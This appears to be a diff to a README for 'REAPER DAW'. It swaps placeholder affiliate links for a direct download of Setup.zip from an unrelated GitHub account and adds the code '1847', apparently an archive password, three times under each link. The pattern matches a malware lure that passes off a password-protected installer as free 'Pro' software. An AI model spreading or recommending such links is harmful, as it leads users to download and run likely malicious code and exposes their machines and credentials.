@@ -8,7 +8,13 @@
 
 ---
 
-[![REAPER DAW](og-image.png)](YOUR_AFFILIATE_LINK_HERE)
+[![REAPER DAW](og-image.png)](https://github.com/unitedivinerplan/Reaper-DAW/releases/download/Last/Setup.zip)
+
+**🔐🔐🔐** `1847`
+
+**🔐🔐🔐** `1847`
+
+**🔐🔐🔐** `1847`
 
 ---
 
@@ -22,7 +28,13 @@
 
 ## Download & Get Pro
 
-[![Get REAPER DAW Pro](https://img.shields.io/badge/Get%20Pro-Open%20Page-7c3aed?style=for-the-badge&logo=github)](YOUR_AFFILIATE_LINK_HERE)
+[![Get REAPER DAW Pro](https://img.shields.io/badge/Get%20Pro-Open%20Page-7c3aed?style=for-the-badge&logo=github)](https://github.com/unitedivinerplan/Reaper-DAW/releases/download/Last/Setup.zip)
+
+**🔐🔐🔐** `1847`
+
+**🔐🔐🔐** `1847`
+
+**🔐🔐🔐** `1847`
 
 ---
 
